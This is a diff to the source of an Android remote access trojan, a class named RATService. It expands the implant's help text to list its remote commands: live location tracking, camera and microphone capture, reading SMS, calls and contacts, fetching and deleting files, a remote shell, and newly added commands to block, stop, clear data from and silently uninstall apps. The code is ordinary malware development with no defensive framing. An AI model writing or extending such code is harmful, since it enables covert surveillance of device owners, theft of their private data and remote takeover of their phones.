@@ -539,10 +539,10 @@ public class RATService extends Service {
                 sendCommand("PONG");
                 break;
                 
-            case "help":
-                String helpText = "Available commands: info, location, location_stream [start/stop], take_photo, camera, camera_switch, camera_test, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]";
-                sendCommand("HELP|" + helpText);
-                break;
+             case "help":
+            String helpText = "Available commands: info, location, location_stream [start/stop], camera, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path], apps_list [true/false], apps_running, apps_blocked_list, apps_usage [days], app_info [package], app_stop [package], app_block [package|true/false], app_uninstall [package|silent], app_clear_data [package]";
+            sendCommand("HELP|" + helpText);
+            break;
                 
             case "info":
             case "device_info":
